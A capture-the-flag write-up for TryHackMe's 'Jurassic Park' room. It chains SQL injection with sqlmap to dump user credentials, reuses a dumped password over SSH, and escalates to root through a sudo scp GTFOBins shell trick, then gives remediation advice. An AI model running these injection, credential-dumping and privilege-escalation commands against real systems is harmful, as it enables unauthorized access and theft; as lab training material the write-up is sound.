# Jurassic Park — TryHackMe Writeup

> **Room:** [Jurassic Park](https://tryhackme.com/room/jurassicpark) · **Difficulty:** Medium–Hard
> **Category:** Web / SQL Injection
> **Author of writeup:** 0xnyx
> **Goal:** Dump credentials from a shop via SQL injection, log in over SSH, and collect flags up to root.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/jurassicpark), **no flags, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**. The chain is: find the SQLi → let sqlmap dump the users → reuse the password over SSH → find flags → GTFOBins privesc to root.

---

## Step 1 — Port scan

**Do**

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp open  ssh   OpenSSH 7.2p2 (Ubuntu)
80/tcp open  http  Apache httpd 2.4.18 — "Jarassic Park"
```

**Why / what next** — SSH is open, so if we can find a password anywhere, we get a real shell. The website is the likely place to find one. Enumerate it.

---

## Step 2 — Map the shop (find the injection point)

**Do** — Brute-force directories, then browse the shop.

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**You get**

```
/index.php  /shop.php  /item.php  /robots.txt  /assets/
```

The homepage links to an "online shop" (`shop.php`), whose products are loaded via `item.php?id=1`, `?id=2`, `?id=3`.

**Why / what next** — A numeric `id` parameter pulled straight from the URL into a product lookup is the textbook SQL-injection target. Test it next.

---

## Step 3 — Confirm the SQL injection

**Do** — Append a single quote to break the query and look for an error. (The error here is hidden inside an HTML comment, so grep for it.)

```bash
curl -s "http://<TARGET>/item.php?id=1'" | grep -i error
```

**You get**

```
... error in your SQL syntax ... near "%" at line N
```

...and the page even trolls you: *"Try SqlMap.. I dare you.."*.

**Why / what next** — An SQL error = confirmed injection. The error `near "%"` tells us our input is wrapped in wildcards, roughly `... LIKE '%$id%'`. That matters: the `id` is used **inside a `LIKE` with a trailing `%'`**, and standard comments (`-- -`, `#`) appear **filtered**, so neutralising the query by hand is painful. This is exactly where an automated tool wins — and the room is literally daring us to use sqlmap.

---

## Step 4 — Dump the database with sqlmap

**Do** — Point sqlmap at the parameter and enumerate the databases. `--batch` = accept defaults, no prompts.

```bash
sqlmap -u "http://<TARGET>/item.php?id=1" --batch --dbs
```

**You get** — sqlmap confirms the parameter is injectable (boolean-based, error-based, **and** time-based) and lists the databases; the custom one serving the shop is **`park`** (this answers the room's "name of the SQL database" question).

**Why / what next** — We have the database name. Now drill into its tables and columns to find where credentials live.

```bash
sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park --tables
sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park --columns
```

**You get**

- `items` — **5 columns** (id, information, package, price, sold) → the shop table (answers the "columns in items" question).
- `users` — id, username, password → the prize.

**Do** — Dump the users table.

```bash
sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park -T users --dump
```

**You get** — Usernames and passwords. One account clearly belongs to **Dennis** (Dennis Nedry, the Jurassic Park saboteur — his password is thematic, in the "I hate dinosaurs" vein).

**Why / what next** — We have a username + password. SSH is open (Step 1). People reuse passwords — so try it over SSH.

---

## Step 5 — SSH in and collect the user-level flags

**Do** — Log in as dennis with the dumped password.

```bash
ssh dennis@<TARGET>
id                          # uid=1001(dennis)
grep PRETTY /etc/os-release # Ubuntu 16.04 — answers the "system version" question
```

**You get** — A shell as `dennis`.

**Do** — Collect the flags reachable as this user. Always check `.bash_history` — people leave secrets there.

```bash
cat ~/flag1.txt                    # flag 1 (home dir)
cat /boot/grub/fonts/flagTwo.txt   # flag 2
cat ~/.bash_history                # flag 3 is hidden in command history
```

**Why / what next** — Three flags down. For the last one (in `/root/`) we need root. Run the first privesc check.

---

## Step 6 — Privilege escalation to root (sudo scp, GTFOBins)

**Do**

```bash
sudo -l
```

**You get**

```
(ALL) NOPASSWD: /usr/bin/scp
```

**Why / what next** — `scp` can run as root without a password. On its own `scp` just copies files, but its `-S` option lets you specify the program used as the "SSH" transport — and that program then runs **as root** ([GTFOBins: scp](https://gtfobins.github.io/gtfobins/scp/)). So we point `-S` at a tiny script of our own.

**Do**

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF      # or: cp /root/flag5.txt /tmp/f; chmod 666 /tmp/f
chmod +x $TF
sudo scp -S $TF x y:
```

> **Gotcha:** `scp` consumes the helper's stdout as part of its own protocol, so an interactive shell can misbehave. For a clean grab, make the helper **copy the root flag to a world-readable file** (e.g. `/tmp`, then `chmod 666`) instead of spawning a shell.

**You get** — Code execution as root → read `/root/flag5.txt`.

**Why / what next** — Root achieved, final flag collected. Box complete.

---

## Flags recap (locations only)

| Flag | Location |
|------|----------|
| 1 | `~/flag1.txt` (dennis home) |
| 2 | `/boot/grub/fonts/flagTwo.txt` |
| 3 | `~/.bash_history` |
| 4 | *does not exist (per the room)* |
| 5 | `/root/flag5.txt` (root) |

## Lessons

- An SQL error hidden in an **HTML comment** is still a confirmed injection — read the raw page source.
- When comments are filtered / the parameter is reused in a `LIKE`, **sqlmap** (error/boolean/time-based) beats fighting the query by hand.
- **Credential reuse**: DB passwords often unlock SSH.
- Always read `.bash_history` for leaked secrets.
- **GTFOBins** `sudo scp -S <script>` runs an arbitrary program as root.

## Remediation

- Use parameterized queries / prepared statements; never concatenate input into SQL.
- Don't expose DB errors to clients, even inside comments.
- Don't reuse the same password between the database and system accounts.
- Clear shell history of secrets; use a secrets manager.
- Avoid `NOPASSWD` sudo on binaries with escape vectors (check GTFOBins).

---

*Write-up for [TryHackMe — Jurassic Park](https://tryhackme.com/room/jurassicpark).*
